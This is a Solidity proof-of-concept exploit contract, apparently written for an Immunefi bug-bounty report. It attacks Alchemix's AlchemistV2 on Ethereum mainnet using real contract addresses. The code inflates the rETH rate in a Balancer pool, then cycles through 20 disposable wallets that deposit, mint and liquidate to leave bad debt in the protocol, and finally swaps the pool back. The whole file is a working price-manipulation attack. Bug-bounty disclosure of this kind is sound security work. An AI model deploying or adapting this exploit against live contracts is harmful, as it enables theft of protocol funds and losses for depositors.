// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/PoC.sol";
import "./external/AlchemistV2.sol";
import "./external/BalancerContract.sol";
import "./external/rETH.sol";

contract AttackContract is PoC {
    RocketTokenRETH constant rETH = RocketTokenRETH(0xae78736Cd615f374D3085123A210448E74Fc6393);
    Vault constant balancer = Vault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    bytes32 constant RethWethBalPool = 0x1e19cf2d73a72ef1332c882f20534b6519be0276000200000000000000000112;
    AlchemistV2 constant alchemistV2 = AlchemistV2(0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c);

    address constant signer = 0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503;

    function initializeAttack() public {
        console.log("\n>>> Initialize attack");

        vm.startPrank(signer, signer);

        _executeAttack();
    }

    function _executeAttack() internal {
        console.log("\n>>> Execute attack");

        // Manipulate the Balancer rate up
        console.log("Manipulate Balancer rate up");
        rETH.approve(address(balancer), 99999999999 ether);
        Vault.SingleSwap memory singleSwap;
        singleSwap.poolId = RethWethBalPool;
        singleSwap.kind = 0;
        singleSwap.assetIn = address(rETH);
        singleSwap.assetOut = address(EthereumTokens.WETH);
        singleSwap.amount = 16500 ether;
        singleSwap.userData = abi.encodePacked(RethWethBalPool);

        Vault.FundManagement memory fundManagement;
        fundManagement.sender = signer;
        fundManagement.fromInternalBalance = false;
        fundManagement.recipient = signer;
        fundManagement.toInternalBalance = false;
        balancer.swap(singleSwap, fundManagement, 0, 9999999999999);

        EthereumTokens.WETH.approve(address(balancer), 999999999999999 ether);

        uint256 maxDepositAmount;

        // Creates a new account, deposits to limit, mints to limit, liquidates until all collateral has been cleared (and deposit limit has been reset)
        // And then switches to next account leaving past account with bad debt
        for (uint8 i = 1; i <= 20; i++) {
            console.log("---------- New account: %i ----------", i);
            address disposableAddress = vm.createWallet(i).addr;
            vm.startPrank(disposableAddress, disposableAddress);

            AlchemistV2.YieldTokenParams memory yieldTokenParameters;

            yieldTokenParameters = alchemistV2.getYieldTokenParameters(address(rETH));
            maxDepositAmount = alchemistV2.convertUnderlyingTokensToYield(
                address(rETH), yieldTokenParameters.maximumExpectedValue - yieldTokenParameters.expectedValue
            );

            console.log("Max expected from liquidation:\t", yieldTokenParameters.maximumExpectedValue);
            console.log("Expected value from liquidation:\t", yieldTokenParameters.expectedValue);

            vm.startPrank(signer, signer);
            rETH.transfer(disposableAddress, maxDepositAmount);
            vm.startPrank(disposableAddress, disposableAddress);

            yieldTokenParameters = alchemistV2.getYieldTokenParameters(address(rETH));
            console.log("Max expected from liquidation:\t", yieldTokenParameters.maximumExpectedValue);
            console.log("Expected value from liquidation:\t", yieldTokenParameters.expectedValue);

            rETH.approve(address(alchemistV2), maxDepositAmount);
            alchemistV2.deposit(address(rETH), maxDepositAmount, disposableAddress);

            uint256 totalValue = alchemistV2.totalValue(disposableAddress);
            uint256 canMint = totalValue / 2;

            alchemistV2.mint(canMint, signer);
            alchemistV2.liquidate(address(rETH), 999999999999999 ether, 0);

            uint256 midvalue = alchemistV2.totalValue(disposableAddress);
            console.log("Collateral value after first liquidate:\t", midvalue);

            alchemistV2.liquidate(address(rETH), 999999999999999 ether, 0);

            uint256 midvalue2 = alchemistV2.totalValue(disposableAddress);
            console.log("Collateral value after second liquidate:\t", midvalue2);

            (uint256 shares, uint256 lastAccruedWeight) = alchemistV2.positions(disposableAddress, address(rETH));
            alchemistV2.liquidate(address(rETH), shares, 0);
            (uint256 sharesLeft, uint256 lastAccruedWeight2) = alchemistV2.positions(disposableAddress, address(rETH));

            uint256 postValue = alchemistV2.totalValue(disposableAddress);
            uint256 accumulatedCollateralLeft = postValue;

            console.log("Collateral value after last liquidation:\t", postValue);

            // Swap back on balancer pool equal to amount alchemix unwrapped to keep pool balance at a constant value so it doesnt saturate
            vm.startPrank(signer, signer);
            Vault.SingleSwap memory singleSwap2;
            singleSwap2.poolId = RethWethBalPool;
            singleSwap2.kind = 1;
            singleSwap2.assetIn = address(EthereumTokens.WETH);
            singleSwap2.assetOut = address(rETH);
            singleSwap2.amount = maxDepositAmount;
            singleSwap2.userData = abi.encodePacked(RethWethBalPool);

            Vault.FundManagement memory fundManagement2;
            fundManagement2.sender = signer;
            fundManagement2.fromInternalBalance = false;
            fundManagement2.recipient = signer;
            fundManagement2.toInternalBalance = false;

            balancer.swap(singleSwap2, fundManagement2, 999999999999999 ether, 9999999999999);

            //Because yieldtoken out = very small number liquidation limits does not matter
            vm.startPrank(disposableAddress, disposableAddress);
            (uint256 currentLimit, uint256 rate, uint256 maximum) =
                alchemistV2.getLiquidationLimitInfo(address(EthereumTokens.WETH));

            console.log("Remaining liduidation limit:\t", currentLimit);
        }
        console.log("------------------");
        vm.startPrank(signer, signer);

        // rebalance pool and unmanipulate using weth balance left
        uint256 WETHBalance = EthereumTokens.WETH.balanceOf(signer);

        Vault.SingleSwap memory singleSwap3;
        singleSwap3.poolId = RethWethBalPool;
        singleSwap3.kind = 0;
        singleSwap3.assetIn = address(EthereumTokens.WETH);
        singleSwap3.assetOut = address(rETH);
        singleSwap3.amount = WETHBalance;
        singleSwap3.userData = abi.encodePacked(RethWethBalPool);

        Vault.FundManagement memory fundManagement3;
        fundManagement3.sender = signer;
        fundManagement3.fromInternalBalance = false;
        fundManagement3.recipient = signer;
        fundManagement3.toInternalBalance = false;

        // Manipulate the Balancer rate back down
        console.log("Manipulate Balancer rate back down");
        balancer.swap(singleSwap3, fundManagement3, 0, 9999999999999);

        _completeAttack();
    }

    function _completeAttack() internal {
        console.log("\n>>> Complete attack");

        vm.stopPrank();
    }
}
